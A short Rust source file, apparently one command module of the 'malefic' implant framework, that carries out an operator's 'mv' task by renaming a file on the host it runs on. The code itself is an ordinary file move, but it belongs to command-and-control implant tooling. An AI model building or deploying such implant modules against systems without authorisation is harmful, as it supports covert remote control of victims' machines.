use async_trait::async_trait;
use malefic_trait::module_impl;
use crate::{check_request, Module, Result, check_field, TaskResult};
use malefic_helper::protobuf::implantpb::spite::Body;


pub struct Mv {}

#[async_trait]
#[module_impl("mv")]
impl Module for Mv {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::Request)?;
        let params = check_field!(request.args, 2)?;

        std::fs::rename(&params[0], &params[1])?;

        Ok(TaskResult::new(id))
    }
}